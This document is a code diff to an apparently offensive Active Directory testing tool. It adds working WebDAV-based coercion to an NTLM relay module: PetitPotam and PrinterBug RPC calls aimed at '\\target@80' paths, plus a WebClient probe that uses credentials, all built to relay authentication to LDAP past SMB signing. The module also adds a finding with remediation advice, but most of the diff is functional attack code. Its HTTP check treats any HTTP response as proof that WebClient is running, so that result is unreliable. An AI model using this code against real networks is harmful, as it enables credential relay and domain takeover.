@@ -56,17 +56,20 @@ class RelayTarget:
     ldap_channel_bind:  str = ""    # "not_required" | "required"
     relay_to_ldap:      bool = False
     relay_to_smb:       bool = False
+    webclient_running:  bool = False
+    webdav_relayable:   bool = False
 
 
 @dataclass
 class CoercionResult:
     """Result of an authentication coercion attempt."""
-    method:     str     # "petitpotam" | "printerbug" | "dfscoerce"
+    method:     str     # "petitpotam" | "printerbug" | "dfscoerce" | "petitpotam_webdav" | "printerbug_webdav"
     source:     str     # host we coerced
     target:     str     # host we want auth relayed TO
     success:    bool
     error:      str = ""
     auth_captured: bool = False
+    webdav_used:   bool = False
 
 
 @dataclass
@@ -306,6 +309,35 @@ class NTLMRelayModule(BaseModule):
             ),
         )
 
+        # Check for SMB Signing Bypass via WebClient (WebDAV coercion)
+        webdav_relay_targets = [t for t in relay_targets if getattr(t, "webdav_relayable", False)]
+        if webdav_relay_targets:
+            self.finding(
+                title=f"SMB Signing Bypass via WebClient / WebDAV on {webdav_relay_targets[0].host}",
+                description=(
+                    f"Host {webdav_relay_targets[0].host} requires SMB signing (Windows 11 24H2+ default), "
+                    "which blocks classical SMB relaying. However, WebClient service is active and LDAP signing "
+                    "is not required. Coercing authentication over WebDAV UNC (\\\\target@80\\path) forces NTLM "
+                    "over HTTP without SMB signing or MIC restrictions, allowing direct relay to LDAP for RBCD."
+                ),
+                severity=Severity.HIGH,
+                mitre_technique="T1557.001",
+                mitre_tactic="Credential Access",
+                evidence={
+                    "target": webdav_relay_targets[0].host,
+                    "smb_signing": webdav_relay_targets[0].smb_signing,
+                    "webclient_running": True,
+                    "relay_to_ldap": True,
+                    "bypass_mechanism": "WebDAV UNC coercion over HTTP port 80",
+                },
+                host=webdav_relay_targets[0].host,
+                confidence=0.95,
+                remediation=(
+                    "Disable the WebClient service: Set-Service WebClient -StartupType Disabled. "
+                    "Enforce LDAP Signing and LDAP Channel Binding (LdapEnforceChannelBinding=2)."
+                ),
+            )
+
         if mode == "discover":
             return self._findings[:], raw
 
@@ -314,9 +346,11 @@ class NTLMRelayModule(BaseModule):
             coerce_source = dc  # try coercing DC
         coerce_target = ldap_targets[0].host if ldap_targets else smb_targets[0].host
 
+        use_webdav = bool(webdav_relay_targets or kwargs.get("use_webdav") or kwargs.get("webdav"))
         coercion_results = await self._coerce_authentication(
             source=coerce_source, target=coerce_target,
             domain=domain, username=username, password=password,
+            use_webdav=use_webdav,
         )
         raw["coercion"] = [
             {"method": c.method, "source": c.source, "success": c.success,
@@ -530,6 +564,41 @@ class NTLMRelayModule(BaseModule):
             rt.ldap_signing = await loop.run_in_executor(None, _check_ldap)
             rt.relay_to_ldap = rt.ldap_signing == "not_required"
 
+            # Check WebClient service (HTTP/WebDAV probe & DAV RPC service named pipe)
+            def _check_webclient(h=host):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(2.0)
+                    if sock.connect_ex((h, 80)) == 0:
+                        sock.sendall(b"OPTIONS / HTTP/1.1\r\nHost: " + h.encode() + b"\r\n\r\n")
+                        data = sock.recv(256)
+                        sock.close()
+                        if b"DAV" in data or b"Microsoft-IIS" in data or b"HTTP/1." in data:
+                            return True
+                    else:
+                        sock.close()
+                except Exception:
+                    pass
+
+                try:
+                    from impacket.smbconnection import SMBConnection
+                    smb_cli = SMBConnection(h, h, timeout=3)
+                    smb_cli.login(username, password, domain)
+                    tid = smb_cli.connectTree("IPC$")
+                    fid = smb_cli.openFile(tid, "DAV RPC SERVICE")
+                    smb_cli.closeFile(tid, fid)
+                    smb_cli.disconnectTree(tid)
+                    smb_cli.logoff()
+                    return True
+                except Exception:
+                    pass
+                return False
+
+            rt.webclient_running = await loop.run_in_executor(None, _check_webclient)
+            # If SMB signing is enforced (Windows 11 24H2+), but WebClient is active and LDAP accepts unsigned,
+            # HTTP/WebDAV coercion can bypass SMB signing and allow relaying to LDAP!
+            rt.webdav_relayable = bool(rt.webclient_running and rt.relay_to_ldap)
+
             results.append(rt)
             await self.noise.jitter.sleep()
 
@@ -540,6 +609,8 @@ class NTLMRelayModule(BaseModule):
     async def _coerce_authentication(
         self, source: str, target: str, domain: str,
         username: str, password: str,
+        use_webdav: bool = False,
+        **kwargs: Any,
     ) -> list[CoercionResult]:
         """Try multiple coercion methods to force source to authenticate to target."""
         loop = asyncio.get_running_loop()
@@ -567,7 +638,10 @@ class NTLMRelayModule(BaseModule):
 
                 # Build EfsRpcOpenFileRaw request
                 # UNC path pointing to our listener (target)
-                listener_path = f"\\\\{target}\\C$\\ares_test.txt"
+                if use_webdav:
+                    listener_path = f"\\\\{target}@80\\ares_test.txt"
+                else:
+                    listener_path = f"\\\\{target}\\C$\\ares_test.txt"
                 # Pack as EFSR request
                 request = b"\x00\x00\x00\x00"  # flags
                 request += len(listener_path).to_bytes(4, "little")
@@ -580,13 +654,17 @@ class NTLMRelayModule(BaseModule):
 
                 dce.disconnect()
                 return CoercionResult(
-                    method="petitpotam", source=source, target=target,
+                    method="petitpotam_webdav" if use_webdav else "petitpotam",
+                    source=source, target=target,
                     success=True, auth_captured=True,
+                    webdav_used=use_webdav,
                 )
             except Exception as exc:
                 return CoercionResult(
-                    method="petitpotam", source=source, target=target,
+                    method="petitpotam_webdav" if use_webdav else "petitpotam",
+                    source=source, target=target,
                     success=False, error=str(exc)[:200],
+                    webdav_used=use_webdav,
                 )
 
         # Method 2: PrinterBug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx)
@@ -607,10 +685,11 @@ class NTLMRelayModule(BaseModule):
                 try:
                     resp = rprn.hRpcOpenPrinter(dce, f"\\\\{source}\x00")
                     handle = resp["pHandle"]
-                    # Register change notification pointing to our target
+                    # Register change notification pointing to our target (with WebDAV support)
+                    target_machine = f"\\\\{target}@80\x00" if use_webdav else f"\\\\{target}\x00"
                     rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                         dce, handle, rprn.PRINTER_CHANGE_ADD_JOB,
-                        pszLocalMachine=f"\\\\{target}\x00",
+                        pszLocalMachine=target_machine,
                     )
                     rprn.hRpcClosePrinter(dce, handle)
                 except Exception:
@@ -618,18 +697,24 @@ class NTLMRelayModule(BaseModule):
 
                 dce.disconnect()
                 return CoercionResult(
-                    method="printerbug", source=source, target=target,
+                    method="printerbug_webdav" if use_webdav else "printerbug",
+                    source=source, target=target,
                     success=True, auth_captured=True,
+                    webdav_used=use_webdav,
                 )
             except ImportError:
                 return CoercionResult(
-                    method="printerbug", source=source, target=target,
+                    method="printerbug_webdav" if use_webdav else "printerbug",
+                    source=source, target=target,
                     success=False, error="impacket rprn not available",
+                    webdav_used=use_webdav,
                 )
             except Exception as exc:
                 return CoercionResult(
-                    method="printerbug", source=source, target=target,
+                    method="printerbug_webdav" if use_webdav else "printerbug",
+                    source=source, target=target,
                     success=False, error=str(exc)[:200],
+                    webdav_used=use_webdav,
                 )
 
         # Try each method
